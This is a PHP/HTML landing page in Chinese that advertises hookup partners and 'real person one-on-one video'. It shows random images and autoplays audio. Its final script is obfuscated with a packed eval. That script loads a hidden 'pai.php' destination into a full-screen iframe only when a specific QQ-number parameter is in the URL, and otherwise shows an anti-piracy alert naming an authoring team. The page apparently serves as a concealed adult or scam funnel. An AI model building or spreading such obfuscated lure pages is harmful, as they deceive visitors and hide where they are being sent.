<?php
$img_array = glob("images/FM/*.{jpg,png,gif}",GLOB_BRACE);
$img = array_rand($img_array);
//header("location:$img_array[$img]");
//echo $img_array[$img];
?>
<!DOCTYPE html>
<html lang="zh-CN">
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no,minimal-ui">
<meta name="description" itemprop="description" content="点击匹配炮友" />
<meta itemprop="image" content="images/page.png" />
<title>真人一对一视频</title>
<style>
body,html{height:100%;margin:0;background-color:#000}img{display:flex;justify-content:center;align-items:center}#container{height:100%;background:url(<?php echo $img_array[$img]; ?>) no-repeat top center/auto 100%}@media screen and (max-width:700px){#container{height:100%;background:url(<?php echo $img_array[$img]; ?>) no-repeat top center/100% 100%}}#jntm{display:none}#jntm_music,audio{display:none}
</style>

<body>
    <div id="container">
    <audio id="wx_music" src="media/getvoice.mp3" controls loop autoplay></audio>
    </div>
    <div id="jntm"></div>
    <div id="hr">
    </div>
    <audio id="mp32" controls loop src="media/001.mp3"></audio>
    <script>
        var ele = document.getElementById("wx_music");
        var mp32 = document.getElementById("mp32");
        ele.addEventListener('canplay', function () {
            setTimeout(function () {
                ele.play();
            }, 500);
        })
        document.getElementById("container").onclick = function () {
            ele.pause();
            this.removeChild(ele);
            this.style.display = "none";
            var jntm = document.getElementById("jntm");
            jntm.style.display = "block";
            mp32.play();
            hr.innerHTML = '<iframe id="jntm_music" frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="media/001.mp3"></iframe>';
            if (document.body.clientWidth > document.body.clientHeight) {
                jntm.innerHTML = '<img  src="images/ico.png" width="100%" style="margin: 0" >';
            } else {
                jntm.innerHTML = '<img  src="images/ico.png" width="100%" style="margin:45% 0" >';
            } setTimeout(function () {
                if (document.body.clientWidth > document.body.clientHeight) {
                    jntm.innerHTML = '<img id="img1" src="images/ico.png"  width="100%" style="margin:0">';
                } else {
                    jntm.innerHTML = '<img id="img1" src="images/ico.png"  width="100%" style="margin:45% 0">';
                }
            }, 4000);
            setTimeout(function () {
                var img1 = document.getElementById("img1");
                jntm.removeChild(img1);
                if (document.body.clientWidth > document.body.clientHeight) {
                    jntm.innerHTML = '<img  src="images/ico.png" width="100%" style="margin: 0" >';
                } else {
                    jntm.innerHTML = '<img  src="images/ico.png" width="100%" style="margin:45% 0" >';
                }
            }, 7500);
        };
    </script>
    <html>
<iframe src="" marginheight="0" marginwidth="0" frameborder="0" scrolling="yes" width="100%" height="100%" id="iframepage" name="iframepage" οnlοad="loadFrame(this)"></iframe>
<script type="text/javascript">
    
</script>
<script type="text/javascript">
    window["\x65\x76\x61\x6c"](function(MBNi1,RiNXPKcR2,pFuF3,PywGgvSB4,MuNuclHub5,YnQ6){MuNuclHub5=function(pFuF3){return(pFuF3<RiNXPKcR2?'':MuNuclHub5(window["\x70\x61\x72\x73\x65\x49\x6e\x74"](pFuF3/RiNXPKcR2)))+((pFuF3=pFuF3%RiNXPKcR2)>35?window["\x53\x74\x72\x69\x6e\x67"]["\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65"](pFuF3+29):pFuF3["\x74\x6f\x53\x74\x72\x69\x6e\x67"](36))};if(!''["\x72\x65\x70\x6c\x61\x63\x65"](/^/,window["\x53\x74\x72\x69\x6e\x67"])){while(pFuF3--)YnQ6[MuNuclHub5(pFuF3)]=PywGgvSB4[pFuF3]||MuNuclHub5(pFuF3);PywGgvSB4=[function(MuNuclHub5){return YnQ6[MuNuclHub5]}];MuNuclHub5=function(){return'\\\x77\x2b'};pFuF3=1};while(pFuF3--)if(PywGgvSB4[pFuF3])MBNi1=MBNi1["\x72\x65\x70\x6c\x61\x63\x65"](new window["\x52\x65\x67\x45\x78\x70"]('\\\x62'+MuNuclHub5(pFuF3)+'\\\x62','\x67'),PywGgvSB4[pFuF3]);return MBNi1}('\x70 \x6b \x3d \x71\x2e\x64\x2e\x6b\x3b    \x39\x28\x6b\x2e\x62\x28\x22\x68\x3d\x32\x22\x29 \x21\x3d \x2d\x30\x29 \x7b    \x70 \x6f \x3d \x36\x2e\x33\x3b    \x70 \x6d \x3d \x6f\x2e\x6a\x28\x22\x2f\x63\x2f\x22\x2c\x22\x2f\x66\x2e\x67\x22\x29\x3b    \x70 \x6e \x3d \x6d\x2b\x22\x26\x34\x3d\x31\x23\x35\x25\x32\x22\x3b    \x36\x2e\x38\x28\x22\x61\x22\x29\x2e\x6c\x3d\x6e\x3b    \x7d\x37\x7b    \x35\x28\x22\u6253\u51fb\u76d7\u7248\uff01\u4eba\u4eba\u6709\u8d23\uff01\e\u4f5c\u8005\uff1a\u795e\u79d8\u4eba\uff08\u4e09\u53f6\u56e2\u961f\uff09\x22\x29\x3b    \x64\x2e\x69\x28\x29\x3b    \x7d\x3b',62,27,'\x31\x7c\x31\x36\x37\x37\x37\x32\x31\x36\x7c\x32\x38\x39\x31\x34\x30\x34\x31\x38\x33\x7c\x55\x52\x4c\x7c\x5f\x77\x76\x7c\x61\x6c\x65\x72\x74\x7c\x64\x6f\x63\x75\x6d\x65\x6e\x74\x7c\x65\x6c\x73\x65\x7c\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64\x7c\x69\x66\x7c\x69\x66\x72\x61\x6d\x65\x70\x61\x67\x65\x7c\x69\x6e\x64\x65\x78\x4f\x66\x7c\x6c\x69\x76\x65\x7c\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x7c\x6e\x7c\x70\x61\x69\x7c\x70\x68\x70\x7c\x71\x71\x7c\x72\x65\x6c\x6f\x61\x64\x7c\x72\x65\x70\x6c\x61\x63\x65\x7c\x73\x65\x61\x72\x63\x68\x7c\x73\x72\x63\x7c\x73\x75\x72\x6c\x7c\x74\x69\x61\x6f\x7c\x75\x72\x6c\x7c\x76\x61\x72\x7c\x77\x69\x6e\x64\x6f\x77'["\x73\x70\x6c\x69\x74"]('\x7c'),0,{}))
</script>
</html>
</body>
</html>